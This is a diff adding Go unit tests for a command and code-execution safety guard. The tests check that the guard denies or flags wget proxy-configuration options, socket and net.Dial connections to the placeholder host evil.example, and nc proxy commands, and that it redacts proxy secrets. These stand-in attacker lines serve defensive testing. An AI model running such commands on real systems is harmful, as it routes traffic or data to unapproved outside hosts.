@@ -386,6 +386,83 @@ func TestGuardSeparatesOptionValuesFromDestinations(t *testing.T) {
 	require.Equal(t, "network.destination_unparsed", report.RuleID)
 }
 
+func TestGuardReviewsWgetExecutableConfiguration(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, command := range []string{
+		"wget -e use_proxy=yes https://api.github.com/data",
+		"wget -ehttps_proxy=http://evil.example https://api.github.com/data",
+		"wget --execute https_proxy=http://evil.example https://api.github.com/data",
+		"wget --execute=https_proxy=http://evil.example https://api.github.com/data",
+	} {
+		report := guard.Scan(safety.Request{Command: command})
+		require.Equal(t, safety.DecisionNeedsHumanReview, report.Decision, command)
+		require.Equal(t, "network.config", report.RuleID, command)
+	}
+}
+
+func TestGuardRecognizesGroupedAndObjectNetworkAliases(t *testing.T) {
+	policy := safety.DefaultPolicy()
+	policy.NetworkAllowlist = []string{"github.com"}
+	guard := mustGuard(t, policy)
+	for _, block := range []codeexecutor.CodeBlock{
+		{Language: "go", Code: "import (\n n \"net\"\n)\nn.Dial(\"tcp\", \"evil.example:443\")"},
+		{Language: "python", Code: "import socket\nsock = socket.socket()\nsock.connect((\"evil.example\", 443))"},
+		{Language: "python", Code: "import socket\nsock = socket.socket()\nother = sock\nother.connect((\"evil.example\", 443))"},
+	} {
+		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
+		require.Equal(t, safety.DecisionDeny, report.Decision, block.Language)
+		require.Equal(t, "network.destination", report.RuleID, block.Language)
+	}
+
+	for _, block := range []codeexecutor.CodeBlock{
+		{Language: "go", Code: "import (\n n \"net\"\n)\nn.Dial(\"tcp\", \"api.github.com:443\")"},
+		{Language: "python", Code: "import socket\nsock = socket.socket()\nsock.connect((\"api.github.com\", 443))"},
+		{Language: "python", Code: "note = 'sock = socket.socket()'\nsock.connect((\"evil.example\", 443))"},
+	} {
+		report := guard.Scan(safety.Request{CodeBlocks: []codeexecutor.CodeBlock{block}})
+		require.Equal(t, safety.DecisionAllow, report.Decision, block.Language)
+	}
+}
+
+func TestReportRedactsPathQualifiedNCProxyAuth(t *testing.T) {
+	guard := mustGuard(t, safety.DefaultPolicy())
+	for _, tc := range []struct {
+		command string
+		secret  string
+	}{
+		{"/usr/bin/nc -P absolute-proxy-secret -x evil.example:1080 api.github.com 443", "absolute-proxy-secret"},
+		{"./bin/nc -Prelative-proxy-secret -x evil.example:1080 api.github.com 443", "relative-proxy-secret"},
+	} {
+		report := guard.Scan(safety.Request{Command: tc.command})
+		encoded, err := json.Marshal(report)
+		require.NoError(t, err)
+		require.True(t, report.Redacted)
+		require.NotContains(t, string(encoded), tc.secret)
+	}
+}
+
+func TestGuardDetectsGoTestPackageParallelism(t *testing.T) {
+	guard := mustGuard(t, safety.DefaultPolicy())
+	for _, command := range []string{
+		"go test -p 100 ./...",
+		"go test -p100 ./...",
+		"go test -p=100 ./...",
+	} {
+		report := guard.Scan(safety.Request{Command: command})
+		require.Equal(t, safety.DecisionNeedsHumanReview, report.Decision, command)
+		require.Equal(t, "resource.concurrency", report.RuleID, command)
+	}
+	for _, command := range []string{
+		"go env -p 100",
+		"go test ./pkg/-p",
+	} {
+		report := guard.Scan(safety.Request{Command: command})
+		require.Equal(t, safety.DecisionAllow, report.Decision, command)
+	}
+}
+
 func TestGuardEnforcesResourcePolicy(t *testing.T) {
 	guard := mustGuard(t, safety.DefaultPolicy())
 	tests := []struct {
